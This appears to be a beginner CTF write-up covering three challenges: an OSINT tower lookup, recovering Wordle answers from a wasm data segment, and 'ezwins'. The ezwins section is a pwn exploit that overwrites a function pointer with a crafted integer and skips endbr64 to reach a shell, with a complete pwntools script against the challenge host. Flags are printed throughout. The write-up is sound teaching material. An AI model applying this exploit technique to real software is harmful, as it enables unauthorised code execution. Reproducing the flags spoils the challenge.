# beginner
## radioactive
Based on the image, go to the website and look up tower site number 2154006
https://www.rfnsa.com.au/2154006/detail
![image](https://hackmd.io/_uploads/ryMbBcoigl.png)
**Flag: K17{-33.717,160.987}**


## daily re

* The challenge is a Wordle-like game built with WebAssembly (`words.wasm`) + JavaScript.
* The interface calls `get_word` using the current day's `DAY_NUMBER` and `DAY_KEY` to obtain the answer word.
* Task: find the answers for days 72, 73, and 74, in format `K17{word1, word2, word3}`.
* Hint: the Day 17 answer is `zonal`.


### Initial Analysis

1. In `index.html`, you can see:

   ```js
   Module.ccall('get_word', 'string', ['number','string'], [DAY_NUMBER-1, DAY_KEY])
   ```

   This shows how `get_word` is called.
2. Directly calling `get_word` for 72/73/74 returns an empty string, indicating additional validation.
3. Decompiling `words.wasm` shows `get_word` computes a position from index and key, then validates the key against a table value. This implies the game answers are stored in the data section.

### Key Observation

In the `words.wasm` data section, a clear structure appears:

```
(index) (hashkey) (word)
```

For example:

```
\11 70e7726a9b8d5e65a6dbb19cf784ad5a zonal
\12 b3f61e6d07992d25a42114c7d50f5f69 loyal
\13 67cb213109a49a3b9d3ca167c051dad9 zesty
...
```

From this, we can directly see:

* Day 17 (`0x11`, decimal 17) is `zonal`.
* Each subsequent line corresponds to Day 18, 19, ... in order.

Count forward directly:

* `0x11` (17) = zonal
* So Day N's word appears after tag `0xNN`.

Found:

* `0x48` (72) → `limbo`
* `0x49` (73) → `urban`
* `0x4a` (74) → `fiber`

### Summary

The trick is that although `get_word` appears to enforce key checks, the actual answers are stored in plaintext in the wasm data segment. By inspecting or dumping it, all daily words can be recovered.
**Flag: K17{limbo, urban, fiber}**

## ezwins
#### 1. Initial Analysis

First, run basic checks on the provided binary `chal`.

```bash
$ checksec chal
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
```

From `checksec`, this is a 64-bit ELF with major protections enabled, including NX, Stack Canary, and even newer `SHSTK` (Shadow Stack) and `IBT` (Indirect Branch Tracking). However, PIE is disabled, so code/function addresses are fixed each run, which significantly lowers exploit difficulty.

Next, decompile with IDA Pro or Ghidra. The `main` pseudocode is:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  // ... (stack setup) ...
  char s[8];    // [rsp+10h] [rbp-50h] - Name buffer
  char v8;      // [rsp+30h] [rbp-30h] - Age variable
  __int64 (__fastcall *v9)(...); // [rsp+31h] [rbp-2Fh] - Function pointer

  v9 = print_greeting; // v9 points to print_greeting
  puts("What's your name?");
  fgets(s, 32, stdin); // read name
  puts("How old are you?");
  __isoc99_scanf(" %lld", &v8); // read age
  // ...
  ((void (__fastcall *)(...))v9)(...); // call function pointed by v9
  return 0;
}
```

Program logic is simple:
1. Initialize function pointer `v9` to `print_greeting`.
2. Read user name into buffer `s`.
3. Read user age into variable `v8`.
4. Call the function pointed to by `v9`.

There is also a `win` function that executes `system("/bin/sh")`, giving a shell. Our goal is to make the program call `win`.

#### 2. Vulnerability Discovery

From pseudocode and stack layout, we find a classic stack overflow:

*   `v8` is at `[rbp-30h]`.
*   Function pointer `v9` is at `[rbp-2Fh]`.

`v8` and `v9` are adjacent on the stack. `__isoc99_scanf(" %lld", &v8)` writes an 8-byte integer at `v8`, so age input writes from `[rbp-30h]` to `[rbp-29h]`, fully overwriting the lower 7 bytes of `v9`.

This is the attack vector: **by crafting the "age" input, we can overwrite function pointer `v9` to point to `win`.**

#### 3. Bypassing CET (Control-Flow Enforcement Technology)

When attempting a direct jump to `win`, we see its first instruction is `endbr64`.

```assembly
0x4011f6 <win+0>: endbr64
0x4011fa <win+4>: push   rbp
...
```

This is part of Intel CET. If an indirect branch (like a function pointer call) targets an address without `endbr64`, the CPU raises an exception and the program crashes.

Fortunately, we can skip this instruction and jump to `0x4011fa` (`win+4`), where the function body begins, bypassing this protection.

#### 4. Exploit Flow

Final exploit strategy:

1.  **Name input handling**: send only a newline (`\n`) so `fgets` writes a null byte `\x00` at the start of the buffer and does not interfere with `v8`/`v9`.

2.  **Build the age payload**:
    *   Target address is `win+4`, i.e. `0x4011fa`.
    *   Original `v9` is `print_greeting` at `0x401210`.
    *   `scanf` writes 8 bytes starting at `[rbp-30h]`.
    *   Build an 8-byte payload that, when written as an integer, changes `v9` to `0x4011fa`.
    *   The first payload byte overwrites `[rbp-30h]` and can be arbitrary (e.g., `\x00`).
    *   The remaining 7 bytes overwrite the lower 7 bytes of `v9`, so we place the lower 7 bytes of `0x4011fa`.

    So the payload is:
    `payload_bytes = b'\x00' + p64(win_addr + 4)[:7]`

3.  **Get the flag**:
    *   Convert this payload to an integer and send it as "age".
    *   The program calls overwritten `v9` (`win+4`), successfully executing `system("/bin/sh")`.
    *   In the interactive shell, run `ls -la /` to locate the flag file (usually `/flag`) and read it with `cat /flag`.


```python
#exploit.py

#!/usr/bin/env python3
from pwn import *
import ctypes
import time

BIN_PATH = './chal'
HOST = 'challenge.secso.cc'
PORT = 8001

context.binary = ELF(BIN_PATH)
elf = context.binary
context.log_level = 'info'

win_addr = None
if 'win' in elf.symbols:
    # Skip endbr64 instruction
    win_addr_offset = elf.symbols['win'] + 4
    log.info(f'found symbol win at 0x{elf.symbols["win"]:x}')
    log.info(f'Using win address with offset: 0x{win_addr_offset:x}')
    win_addr = win_addr_offset
else:
    log.error('win symbol not found')
    exit(1)

def solve(io):
    # 1. Send a newline to prevent fgets from affecting the following stack data
    name_payload = b'\n'
    io.sendafter(b"What's your name?", name_payload)
    log.info(f"Sent name: {name_payload!r}")

    # 2. Construct age payload
    # Original v9 value is 0x401210
    # Our target is 0x4011fa
    # scanf writes 8 bytes starting at &v8 ([rbp-30h])
    # v9 is at [rbp-2Fh], so bytes 2-8 from scanf overwrite v9's lower 7 bytes
    # We need a payload that effectively overwrites v9's lower bytes
    
    # Build payload: [any 1 byte] + [lower 7 bytes of target address]
    payload_bytes = b'\x00' + p64(win_addr)[:7]
    age_as_int = u64(payload_bytes)

    io.sendlineafter(b'How old are you?', str(age_as_int).encode())
    log.info(f"Sent age payload bytes: {payload_bytes!r}")
    log.info(f"Sent age as int: {age_as_int}")

    # Receive flag
    io.interactive()

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```
**Flag: K17{d1dn7_kn0w_u_c0u1d_b3_4ddr355_0f_w1n_m4ny_y34r5_0ld}**